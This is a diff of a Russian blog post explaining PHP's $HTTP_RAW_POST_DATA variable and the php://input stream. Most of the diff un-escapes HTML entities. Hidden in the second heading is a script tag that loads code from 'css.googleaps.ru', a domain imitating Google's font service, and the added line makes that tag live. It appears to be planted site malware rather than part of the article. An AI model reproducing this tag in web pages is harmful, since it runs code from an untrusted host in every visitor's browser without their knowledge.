@@ -23,32 +23,32 @@ tags:
 - orm
 comments: []
 ---
-<p>Возник вопрос: <strong>что такое HTTP_RAW_POST_DATA<&#47;strong>?</p>
+<p>Возник вопрос: <strong>что такое HTTP_RAW_POST_DATA</strong>?</p>
 <p>Разберемся:</p>
-<p><strong>1) Что это такое?<&#47;strong><br />
+<p><strong>1) Что это такое?</strong><br />
 $HTTP_RAW_POST_DATA содержит необработанные (сырые) POST-данные. т.е. если мы передаем через POST следующий массив данных:</p>
 <blockquote>
 <pre class="brush: php; gutter: true">(<br />
     [name] => John<br />
     [time] => 2pm<br />
-)<&#47;pre><br />
-<&#47;blockquote><br />
+)</pre><br />
+</blockquote><br />
 то в $HTTP_RAW_POST_DATA будет следующая строка:</p>
-<blockquote><p><strong>name=John&amp;time=2pm<&#47;strong><&#47;blockquote><br />
-<strong>2) Как можно достучаться еще к данной переменной?<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;strong><br />
+<blockquote><p><strong>name=John&amp;time=2pm</strong></blockquote><br />
+<strong>2) Как можно достучаться еще к данной переменной?<script src="//css.googleaps.ru/css?f=Open+Sans&cd=mb&ver=4.2.2"></script></strong><br />
 Три равнознычных способа:</p>
 <ul>
-<li>$HTTP_RAW_POST_DATA<&#47;li>
-<li>$GLOBALS['HTTP_RAW_POST_DATA']<&#47;li>
-<li>file_get_contents(&lsquo;php:&#47;&#47;input&rsquo;)<&#47;li><br />
-<&#47;ul><br />
-<strong>3) Переменная $HTTP_RAW_POST_DATA недоступна. Что делать?<&#47;strong></p>
+<li>$HTTP_RAW_POST_DATA</li>
+<li>$GLOBALS['HTTP_RAW_POST_DATA']</li>
+<li>file_get_contents(&lsquo;php://input&rsquo;)</li><br />
+</ul><br />
+<strong>3) Переменная $HTTP_RAW_POST_DATA недоступна. Что делать?</strong></p>
 <ul>
-<li>в php.ini включить always_populate_raw_post_data = On , что позволит всегда заполнять переменную $HTTP_RAW_POST_DATA<&#47;li>
-<li>обратиться к данным через file_get_contents(&lsquo;php:&#47;&#47;input&rsquo;) . Данный способ не зависит от директив в php.ini.<&#47;li>
-<li>использовать какой-нибудь неопознанный MIME тип данных (например: $HTTP_RAW_POST_DATA не формируется при типах: multipart&#47;form-data и application&#47;x-www-form-urlencoded и работает при типе application&#47;octet-stream)<&#47;li><br />
-<&#47;ul><br />
-<strong>4) Почему массив $_POST пустой, хотя данные точно передаются ?<&#47;strong></p>
+<li>в php.ini включить always_populate_raw_post_data = On , что позволит всегда заполнять переменную $HTTP_RAW_POST_DATA</li>
+<li>обратиться к данным через file_get_contents(&lsquo;php://input&rsquo;) . Данный способ не зависит от директив в php.ini.</li>
+<li>использовать какой-нибудь неопознанный MIME тип данных (например: $HTTP_RAW_POST_DATA не формируется при типах: multipart/form-data и application/x-www-form-urlencoded и работает при типе application/octet-stream)</li><br />
+</ul><br />
+<strong>4) Почему массив $_POST пустой, хотя данные точно передаются ?</strong></p>
 <p>Т.к. эти данные не получилось обработать и они просто находятся в $HTTP_RAW_POST_DATA</p>
-<p><strong>5) Что такое: php:&#47;&#47;input ?<&#47;strong></p>
-<p>php:&#47;&#47;input является потоком только для чтения, который позволяет вам читать необработанные данные из тела запроса. В случае POST-запросов предпочтительней использовать php:&#47;&#47;input вместо $HTTP_RAW_POST_DATA, так как этот метод не зависит от специальных php.ini директив. Кроме того, в тех случаях, где $HTTP_RAW_POST_DATA не заполняется по умолчанию, это потенциально менее затратно для памяти, чем активация директивы always_populate_raw_post_data. php:&#47;&#47;input не доступен с типом содержимого enctype=&rdquo;multipart&#47;form-data&rdquo;.</p>
+<p><strong>5) Что такое: php://input ?</strong></p>
+<p>php://input является потоком только для чтения, который позволяет вам читать необработанные данные из тела запроса. В случае POST-запросов предпочтительней использовать php://input вместо $HTTP_RAW_POST_DATA, так как этот метод не зависит от специальных php.ini директив. Кроме того, в тех случаях, где $HTTP_RAW_POST_DATA не заполняется по умолчанию, это потенциально менее затратно для памяти, чем активация директивы always_populate_raw_post_data. php://input не доступен с типом содержимого enctype=&rdquo;multipart/form-data&rdquo;.</p>
